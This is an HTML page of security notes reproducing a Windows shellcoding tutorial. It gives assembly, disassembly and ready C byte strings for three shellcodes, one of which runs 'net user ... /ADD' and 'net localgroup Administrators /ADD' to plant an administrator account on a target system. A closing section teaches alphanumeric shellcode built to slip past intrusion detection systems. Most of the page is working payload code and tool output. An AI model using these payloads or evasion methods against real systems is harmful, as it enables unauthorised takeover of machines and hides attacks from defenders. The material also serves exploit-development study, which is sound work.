<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Windows</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Windows</h1><br/><br /><h2>Windows Shellcoding</h2><br /><br /><h3>Example 1 - Sleep is for the Weak!</h3><br />      In order to write successful code, we  first need to decide what functions we wish to use for this shellcode and then find their absolute addresses. For this example we just want a  thread to sleep for an allotted amount of time. Let's load up arwin  (found above) and get started. Remember, the only module guaranteed to  be mapped into the processes address space is kernel32.dll. So for this  example, Sleep seems to be the simplest function, accepting the amount  of time the thread should suspend as its only argument.<br />G:\&gt; <strong>arwin kernel32.dll Sleep</strong><br />arwin - win32 address resolution program - by steve hanna - v.01<br />Sleep is located at <strong>0x77e61bea</strong> in kernel32.dll<br /><br />;<em>sleep.asm</em><br />[SECTION .text]<br /><br />global _start<br /><br /><br />_start:<br />        xor eax,eax<br />        mov ebx, 0x77e61bea ;address of Sleep<br />        mov ax, 5000        ;pause for 5000ms<br />        push eax<br />        call ebx        ;Sleep(ms);<br /><br /><br />steve hanna@1337b0x:~$ <strong>nasm -f elf sleep.asm; ld -o sleep sleep.o; objdump -d sleep</strong><br />sleep:     file format elf32-i386<br /><br />Disassembly of section .text:<br /><br />08048080 &lt;_start&gt;:<br /> 8048080:       31 c0                   xor    %eax,%eax<br /> 8048082:       bb ea 1b e6 77          mov    $0x77e61bea,%ebx<br /> 8048087:       66 b8 88 13             mov    $0x1388,%ax<br /> 804808b:       50                      push   %eax<br /> 804808c:       ff d3                   call   *%ebx<br /><br />Replace the code at the top with:<br /><strong>char code[] = "\x31\xc0\xbb\xea\x1b\xe6\x77\x66\xb8\x88\x13\x50\xff\xd3";</strong><br />When this code is inserted it will cause the parent thread to suspend for  five seconds (note: it will then probably crash because the  stack is smashed at this point :-D).<br /> <br /><br /><h3>Example 2 - A Message to say "Hey"</h3><br />      This second example is useful in the fact  that it will show a shellcoder how to do several things within the  bounds of windows shellcoding. Although this example does nothing more  than pop up a message box and say "hey", it demonstrates absolute  addressing as well as the dynamic addressing using LoadLibrary and  GetProcAddress. The library functions we will be using are LoadLibraryA,  GetProcAddress, MessageBoxA, and ExitProcess (note: the A after the  function name specifies we will be using a normal character set, as  opposed to a W which would signify a wide character set; such as  unicode). Let's load up arwin and find the addresses we need to use. We  will not retrieve the address of MessageBoxA at this time, we will  dynamically load that address.<br />G:\&gt;<strong>arwin kernel32.dll LoadLibraryA</strong><br />arwin - win32 address resolution program - by steve hanna - v.01<br />LoadLibraryA is located at <strong>0x77e7d961</strong> in kernel32.dll<br /><br />G:\&gt;<strong>arwin kernel32.dll GetProcAddress</strong><br />arwin - win32 address resolution program - by steve hanna - v.01<br />GetProcAddress is located at <strong>0x77e7b332</strong> in kernel32.dll<br /><br />G:\&gt;<strong>arwin kernel32.dll ExitProcess</strong><br />arwin - win32 address resolution program - by steve hanna - v.01<br />ExitProcess is located at <strong>0x77e798fd</strong> in kernel32.dll<br /><br /><em>;msgbox.asm </em><br />[SECTION .text]<br /><br />global _start<br /><br /><br />_start:<br />	;eax holds return value<br />	;ebx will hold function addresses<br />	;ecx will hold string pointers<br />	;edx will hold NULL<br /><br />	<br />	xor eax,eax<br />	xor ebx,ebx			;zero out the registers<br />	xor ecx,ecx<br />	xor edx,edx<br />	<br />	jmp short GetLibrary<br />LibraryReturn:<br />	pop ecx				;get the library string<br />	mov [ecx + 10], dl		;insert NULL<br />	mov ebx, 0x77e7d961		;LoadLibraryA(libraryname);<br />	push ecx			;beginning of user32.dll<br />	call ebx			;eax will hold the module handle<br /><br />	jmp short FunctionName<br />FunctionReturn:<br /><br />	pop ecx				;get the address of the Function string<br />	xor edx,edx<br />	mov [ecx + 11],dl		;insert NULL<br />	push ecx<br />	push eax<br />	mov ebx, 0x77e7b332		;GetProcAddress(hmodule,functionname);<br />	call ebx			;eax now holds the address of MessageBoxA<br />	<br />	jmp short Message<br />MessageReturn:<br />	pop ecx				;get the message string<br />	xor edx,edx			<br />	mov [ecx+3],dl			;insert the NULL<br /><br />	xor edx,edx<br />	<br />	push edx			;MB_OK<br />	push ecx			;title<br />	push ecx			;message<br />	push edx			;NULL window handle<br />	<br />	call eax			;MessageBoxA(windowhandle,msg,title,type); Address<br /><br />ender:<br />	xor edx,edx<br />	push eax			<br />	mov eax, 0x77e798fd 		;exitprocess(exitcode);<br />	call eax			;exit cleanly so we don't crash the parent program<br />	<br /><br />	;the N at the end of each string signifies the location of the NULL<br />	;character that needs to be inserted<br />	<br />GetLibrary:<br />	call LibraryReturn<br />	db 'user32.dllN'<br />FunctionName<br />	call FunctionReturn<br />	db 'MessageBoxAN'<br />Message<br />	call MessageReturn<br />	db 'HeyN'<br /><br /><br /><br /><br /><br />[steve hanna@1337b0x]$ <strong>nasm -f elf msgbox.asm; ld -o msgbox msgbox.o; objdump -d msgbox</strong><br /><br />msgbox:     file format elf32-i386<br /><br />Disassembly of section .text:<br /><br />08048080 &lt;_start&gt;:<br /> 8048080:       <strong>31 c0</strong>                   xor    %eax,%eax<br /> 8048082:       <strong>31 db</strong>                   xor    %ebx,%ebx<br /> 8048084:       <strong>31 c9</strong>                   xor    %ecx,%ecx<br /> 8048086:       <strong>31 d2</strong>                   xor    %edx,%edx 8048088:       <strong>eb 37 </strong>                  jmp    80480c1 <br /><br />0804808a :<br /> 804808a:       <strong>59</strong>                      pop    %ecx<br /> 804808b:       <strong>88 51 0a </strong>               mov    %dl,0xa(%ecx)<br /> 804808e:       <strong>bb 61 d9 e7 77</strong>          mov    $0x77e7d961,%ebx<br /> 8048093:       <strong>51</strong>                      push   %ecx<br /> 8048094:       <strong>ff d3 </strong>                  call   *%ebx<br /> 8048096:       <strong>eb 39</strong>                   jmp    80480d1 <br /><br />08048098 :<br /> 8048098:       <strong>59</strong>                      pop    %ecx<br /> 8048099:       <strong>31 d2</strong>                   xor    %edx,%edx<br /> 804809b:       <strong>88 51 0b</strong>                mov    %dl,0xb(%ecx)<br /> 804809e:       <strong>51</strong>                      push   %ecx<br /> 804809f:       <strong>50</strong>                      push   %eax<br /> 80480a0:       <strong>bb 32 b3 e7 77</strong>          mov    $0x77e7b332,%ebx<br /> 80480a5:       <strong>ff d3 </strong>                  call   *%ebx<br /> 80480a7:      <strong> eb 39</strong>                   jmp    80480e2 <br /><br />080480a9 :<br /> 80480a9:       <strong>59</strong>                      pop    %ecx<br /> 80480aa:       <strong>31 d2</strong>                   xor    %edx,%edx<br /> 80480ac:       <strong>88 51 03</strong>                mov    %dl,0x3(%ecx)<br /> 80480af:       <strong>31 d2</strong>                   xor    %edx,%edx<br /> 80480b1:       <strong>52</strong>                      push   %edx<br /> 80480b2:       <strong>51</strong>                      push   %ecx<br /> 80480b3:       <strong>51</strong>                      push   %ecx<br /> 80480b4:       <strong>52</strong>                      push   %edx<br /> 80480b5:       <strong>ff d0</strong>                   call   *%eax<br /><br />080480b7 :<br /> 80480b7:       <strong>31 d2</strong>                   xor    %edx,%edx<br /> 80480b9:       <strong>50</strong>                      push   %eax<br /> 80480ba:       <strong>b8 fd 98 e7 77</strong>          mov    $0x77e798fd,%eax<br /> 80480bf:       <strong>ff d0</strong>                   call   *%eax<br /><br />080480c1 :<br /> 80480c1:       <strong>e8 c4 ff ff ff</strong>          call   804808a <br /> 80480c6:       <strong>75 73</strong>                   jne    804813b <br /> 80480c8:       <strong>65</strong>                      gs<br /> 80480c9:       <strong>72 33</strong>                   jb     80480fe <br /> 80480cb:       <strong>32 2e</strong>                   xor    (%esi),%ch<br /> 80480cd:       <strong>64</strong>                      fs<br /> 80480ce:       <strong>6c</strong>                      insb   (%dx),%es:(%edi)<br /> 80480cf:       <strong>6c</strong>                      insb   (%dx),%es:(%edi)<br /> 80480d0:       <strong>4e</strong>                      dec    %esi<br /><br />080480d1 :<br /> 80480d1:       <strong>e8 c2 ff ff ff</strong>          call   8048098 <br /> 80480d6:       <strong>4d</strong>                      dec    %ebp<br /> 80480d7:       <strong>65</strong>                      gs<br /> 80480d8:       <strong>73 73</strong>                   jae    804814d <br /> 80480da:       <strong>61</strong>                      popa  <br /> 80480db:       <strong>67</strong>                      addr16<br /> 80480dc:       <strong>65</strong>                      gs<br /> 80480dd:       <strong>42</strong>                      inc    %edx<br /> 80480de:       <strong>6f</strong>                      outsl  %ds:(%esi),(%dx)<br /> 80480df:       <strong>78 41</strong>                   js     8048122 <br /> 80480e1:       <strong>4e</strong>                      dec    %esi<br /><br />080480e2 :<br /> 80480e2:       <strong>e8 c2 ff ff ff</strong>          call   80480a9 <br /> 80480e7:       <strong>48</strong>                      dec    %eax<br /> 80480e8:       <strong>65</strong>                      gs<br /> 80480e9:       <strong>79 4e</strong>                   jns    8048139 <br /><br /> Replace the code at the top with:<br /><strong>char code[] =   "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb\x61\xd9"\<br />		"\xe7\x77\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x32"\<br />		"\xb3\xe7\x77\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x03\x31\xd2\x52\x51"\<br />		"\x51\x52\xff\xd0\x31\xd2\x50\xb8\xfd\x98\xe7\x77\xff\xd0\xe8\xc4\xff"\<br />		"\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"\<br />		"\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"\<br />		"\xff\x48\x65\x79\x4e";</strong><br /><br />This example, while not useful in the fact  that it only pops up a message box, illustrates several important  concepts when using windows shellcoding. Static addressing as used in  most of the example above can be a powerful (and easy) way to whip up  working shellcode within minutes. This example shows the process of  ensuring that certain DLLs are loaded into a process space. Once the  address of the MessageBoxA function is obtained ExitProcess is called to  make sure that the program ends without crashing.<br /> <br /><br /><h3>Example 3 - Adding an Administrative Account</h3><br />      This third example is actually quite a bit   simpler than the previous shellcode, but this code allows the  exploiter to add a user to the remote system and give that user  administrative privileges. This code does not require the loading of  extra libraries into the process space because the only functions we  will be using are WinExec and ExitProcess. Note: the idea for this code  was taken from the Metasploit project mentioned above. The difference  between the shellcode is that this code is quite a bit smaller than its  counterpart, and it can be made even smaller by removing the ExitProcess  function!<br />G:\&gt;<strong>arwin kernel32.dll ExitProcess</strong><br />arwin - win32 address resolution program - by steve hanna - v.01<br />ExitProcess is located at <strong>0x77e798fd</strong> in kernel32.dll<br /><br />G:\&gt;<strong>arwin kernel32.dll WinExec</strong><br />arwin - win32 address resolution program - by steve hanna - v.01<br />WinExec is located at <strong>0x77e6fd35</strong> in kernel32.dll<br /><br />;<em>adduser.asm</em><br />[Section .text]<br /><br />global _start<br /><br />_start:<br /><br />jmp short GetCommand<br /><br />CommandReturn:<br />    	 pop ebx            	;ebx now holds the handle to the string<br />   	 xor eax,eax<br />   	 push eax<br />    	 xor eax,eax        	;for some reason the registers can be very volatile, did this just in case<br />  	 mov [ebx + 89],al   	;insert the NULL character<br />  	 push ebx<br />  	 mov ebx,0x77e6fd35<br />  	 call ebx           	;call WinExec(path,showcode)<br /><br />   	 xor eax,eax        	;zero the register again, clears winexec retval<br />   	 push eax<br />   	 mov ebx, 0x77e798fd<br /> 	 call ebx           	;call ExitProcess(0);<br /><br /><br />GetCommand:<br />    	;the N at the end of the db will be replaced with a null character<br />    	call CommandReturn<br />	db "cmd.exe /c net user USERNAME PASSWORD /ADD &amp;&amp; net localgroup Administrators /ADD USERNAMEN"<br /><br />steve hanna@1337b0x:~$ <strong>nasm -f elf adduser.asm; ld -o adduser adduser.o; objdump -d adduser</strong><br /><br />adduser:     file format elf32-i386<br /><br />Disassembly of section .text:<br /><br />08048080 &lt;_start&gt;:<br /> 8048080:       <strong>eb 1b</strong>                   jmp    804809d <br /><br />08048082 :<br /> 8048082:       <strong>5b</strong>                      pop    %ebx<br /> 8048083:       <strong>31 c0</strong>                   xor    %eax,%eax<br /> 8048085:       <strong>50</strong>                      push   %eax<br /> 8048086:       <strong>31 c0</strong>                   xor    %eax,%eax<br /> 8048088:       <strong>88 43 59</strong>                mov    %al,0x59(%ebx)<br /> 804808b:       <strong>53</strong>                      push   %ebx<br /> 804808c:       <strong>bb 35 fd e6 77</strong>          mov    $0x77e6fd35,%ebx<br /> 8048091:       <strong>ff d3</strong>                   call   *%ebx<br /> 8048093:       <strong>31 c0</strong>                   xor    %eax,%eax<br /> 8048095:       <strong>50</strong>                      push   %eax<br /> 8048096:       <strong>bb fd 98 e7 77</strong>          mov    $0x77e798fd,%ebx<br /> 804809b:       <strong>ff d3</strong>                   call   *%ebx<br /><br />0804809d :<br /> 804809d:       <strong>e8 e0 ff ff ff</strong>          call   8048082 <br /> 80480a2:       <strong>63 6d 64</strong>                arpl   %bp,0x64(%ebp)<br /> 80480a5:       <strong>2e</strong>                      cs<br /> 80480a6:       <strong>65</strong>                      gs<br /> 80480a7:       <strong>78 65</strong>                   js     804810e <br /> 80480a9:       <strong>20 2f</strong>                   and    %ch,(%edi)<br /> 80480ab:       <strong>63 20</strong>                   arpl   %sp,(%eax)<br /> 80480ad:       <strong>6e</strong>                      outsb  %ds:(%esi),(%dx)<br /> 80480ae:       <strong>65</strong>                      gs<br /> 80480af:       <strong>74 20</strong>                   je     80480d1 <br /> 80480b1:       <strong>75 73</strong>                   jne    8048126 <br /> 80480b3:       <strong>65</strong>                      gs<br /> 80480b4:       <strong>72 20</strong>                   jb     80480d6 <br /> 80480b6:       <strong>55</strong>                      push   %ebp<br /> 80480b7:       <strong>53</strong>                      push   %ebx<br /> 80480b8:       <strong>45</strong>                      inc    %ebp<br /> 80480b9:       <strong>52</strong>                      push   %edx<br /> 80480ba:       <strong>4e</strong>                      dec    %esi<br /> 80480bb:       <strong>41</strong>                      inc    %ecx<br /> 80480bc:       <strong>4d</strong>                      dec    %ebp<br /> 80480bd:       <strong>45</strong>                      inc    %ebp<br /> 80480be:       <strong>20 50 41</strong>                and    %dl,0x41(%eax)<br /> 80480c1:       <strong>53</strong>                      push   %ebx<br /> 80480c2:       <strong>53</strong>                      push   %ebx<br /> 80480c3:       <strong>57</strong>                      push   %edi<br /> 80480c4:       <strong>4f</strong>                      dec    %edi<br /> 80480c5:       <strong>52</strong>                      push   %edx<br /> 80480c6:       <strong>44</strong>                      inc    %esp<br /> 80480c7:       <strong>20 2f</strong>                   and    %ch,(%edi)<br /> 80480c9:       <strong>41</strong>                      inc    %ecx<br /> 80480ca:       <strong>44</strong>                      inc    %esp<br /> 80480cb:       <strong>44</strong>                      inc    %esp<br /> 80480cc:       <strong>20 26</strong>                   and    %ah,(%esi)<br /> 80480ce:       <strong>26 20 6e 65</strong>             and    %ch,%es:0x65(%esi)<br /> 80480d2:       <strong>74 20</strong>                   je     80480f4 <br /> 80480d4:       <strong>6c</strong>                      insb   (%dx),%es:(%edi)<br /> 80480d5:       <strong>6f</strong>                      outsl  %ds:(%esi),(%dx)<br /> 80480d6:       <strong>63 61 6c</strong>                arpl   %sp,0x6c(%ecx)<br /> 80480d9:       <strong>67 72 6f</strong>                addr16 jb 804814b <br /> 80480dc:       <strong>75 70</strong>                   jne    804814e <br /> 80480de:       <strong>20 41 64</strong>                and    %al,0x64(%ecx)<br /> 80480e1:       <strong>6d</strong>                      insl   (%dx),%es:(%edi)<br /> 80480e2:       <strong>69 6e 69 73 74 72 61</strong>    imul   $0x61727473,0x69(%esi),%ebp<br /> 80480e9:       <strong>74 6f</strong>                   je     804815a <br /> 80480eb:       <strong>72 73</strong>                   jb     8048160 <br /> 80480ed:       <strong>20 2f</strong>                   and    %ch,(%edi)<br /> 80480ef:       <strong>41 </strong>                     inc    %ecx<br /> 80480f0:       <strong>44</strong>                      inc    %esp<br /> 80480f1:       <strong>44</strong>                      inc    %esp<br /> 80480f2:       <strong>20 55 53</strong>                and    %dl,0x53(%ebp)<br /> 80480f5:       <strong>45</strong>                      inc    %ebp<br /> 80480f6:       <strong>52</strong>                      push   %edx<br /> 80480f7:       <strong>4e</strong>                      dec    %esi<br /> 80480f8:       <strong>41</strong>                      inc    %ecx<br /> 80480f9:       <strong>4d</strong>                      dec    %ebp<br /> 80480fa:       <strong>45</strong>                      inc    %ebp<br /> 80480fb:       <strong>4e</strong>                      dec    %esi<br /><br />Replace the code at the top with:<br /><br /> <strong>char code[] =  "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x59\x53\xbb\x35\xfd\xe6\x77"\<br />		"\xff\xd3\x31\xc0\x50\xbb\xfd\x98\xe7\x77\xff\xd3\xe8\xe0\xff\xff\xff"\<br />		"\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73"\<br />		"\x65\x72\x20\x55\x53\x45\x52\x4e\x41\x4d\x45\x20\x50\x41\x53\x53\x57"\<br />		"\x4f\x52\x44\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c"\<br />		"\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73"\<br />		"\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x55\x53\x45\x52"\<br />		"\x4e\x41\x4d\x45\x4e";</strong>  When this code is executed it will add a user to the system with the  specified password, then adds that user to the local Administrators  group. After that code is done executing, the parent process is exited by calling ExitProcess. <br />  <br /><br /><h2>Advanced Shellcoding</h2><br />      This section covers some more advanced topics in shellcoding. Over time  I hope to add quite a bit more content here but for the time being I am very busy. If you have any specific requests for topics in this  section, please do not hesitate to email me.  <br /><br /><h3>Printable Shellcode</h3><br />      The basis for this section is the fact that many Intrustion  Detection Systems detect shellcode because of the non-printable  characters  that are common to all binary data. The IDS observes that a packet  containts some binary data (with for instance a NOP sled within  this binary data) and as a result may drop the packet. In addition to  this, many programs filter input unless it is alpha-numeric.   The motivation behind printable alpha-numeric shellcode should be quite  obvious. By increasing the size of our shellcode we can implement  a method in which our entire shellcode block in in printable  characters. This section will differ a bit from the others presented in  this  paper. This section will simply demonstrate the tactic with small  examples without an all encompassing final example.  <br />      Our first discussion starts with obfuscating the ever blatant NOP  sled. When an IDS sees an arbitrarily long string of NOPs (0x90)  it will most likely drop the packet. To get around this we observe the  decrement and increment op codes:  <br />  <br />	<em><strong>OP Code        Hex       ASCII</strong></em><br />	<strong>inc eax</strong>        0x40        @<br />	<strong>inc ebx</strong>        0x43        C<br />	<strong>inc ecx</strong>        0x41        A<br />	<strong>inc edx</strong>        0x42        B<br />	<strong>dec eax</strong>        0x48        H<br />	<strong>dec ebx</strong>        0x4B        K<br />	<strong>dec ecx</strong>        0x49        I<br />	<strong>dec edx</strong>        0x4A        J    <br /><br />  It should be pretty obvious that if we insert these operations instead  of a NOP sled then the code will not affect the output. This is due to  the fact  that whenever we use a register in our shellcode we wither move a value  into it or we xor it. Incrementing or decrementing the register before  our  code executes will not change the desired operation. <br />   So, the next portion of this printable shellcode section will discuss a  method for making one's entire block of shellcode alpha-numeric-- by  means  of some major tomfoolery. We must first discuss the few opcodes that  fall in the printable ascii range (0x33 through 0x7e).   <br />  	sub eax, 0xHEXINRANGE<br />	push eax<br />	pop eax<br />	push esp<br />	pop esp<br />	and eax, 0xHEXINRANGE<br />	   <br />   Surprisingly, we can actually do whatever we want with these  instructions. I did my best to keep diagrams out of this talk, but I  decided to grace  the world with my wonderful ASCII art. Below you can find a diagram of  the basic plan for constructing the shellcode.<br />  <br />	The plan works as follows:<br />		-make space on stack for shellcode and loader<br />		-execute loader code to construct shellcode<br />		-use a NOP bridge to ensure that there aren't any extraneous bytes that will crash our code.<br />		-profit<br />	  But now I hear you clamoring that we can't use move nor can we subtract  from esp because they don't fall into printable characters!!! Settle  down, have  I got a solution for you! We will use subtract to place values into  EAX, push the value to the stack, then pop it into ESP.<br /><br />  Now you're wondering why I said subtract to put values into EAX, the  problem is we can't use add, and we can't directly assign nonprintable  bytes.  How can we overcome this? We can use the fact that each register has  only 32 bits, so if we force a wrap around, we can arbitrarily assign  values to a register  using only printable characters with two to three subtract  instructions.  <br /><br />  If the gears in your head aren't cranking yet, you should probably stop reading right now.  <br />    	The log awaited ASCII diagram<br />	1)<br />	EIP(loader code) --------ALLOCATED STACK SPACE--------ESP<br /><br />	2)<br />	---(loader code)---EIP-------STACK------ESP--(shellcode--<br /><br />	3)<br />	----loadercode---EIP@ESP----shellcode that was builts---<br />	      So, that diagram probably warrants some explanation. Basically, we take  our already written shellcode, and generate two to three subtract  instructions  per four bytes and do the push EAX, pop ESP trick. This basically  places the constructed shellcode at the end of the stack and works  towards the EIP.  So we construct 4 bytes at a time for the entirety of the code and then  insert a small NOP bridge (indicated by @) between the builder code and  the shellcode.  The NOP bridge is used to word align the end of the builder code.   <br />  <br />  <em>Example code:</em>  <br /><br />	and eax, 0x454e4f4a	;  example of how to zero out eax(unrelated)<br />	and eax, 0x3a313035<br />	<br />	<br />	push esp<br />	pop eax<br />	sub eax, 0x39393333	; construct 860 bytes of room on the stack<br />	sub eax, 0x72727550	<br />	sub eax, 0x54545421<br />	<br />	push eax		; save into esp<br />	pop esp<br />	  Oh, and I forgot to mention, the code must be inserted in reverse order  and the bytes must adhere to the little endian standard.   That job sounds incredibly tedious, thank god that matrix <a href="http://www.phiral.com/research/dissembler_0.9.tgz">wrote a tool</a>  that does it for us!  The point is that now you can use this utility only once you understand  the concepts presented above. Remember, if you don't understand it,  you're just  another script kiddie.   </div></body></html>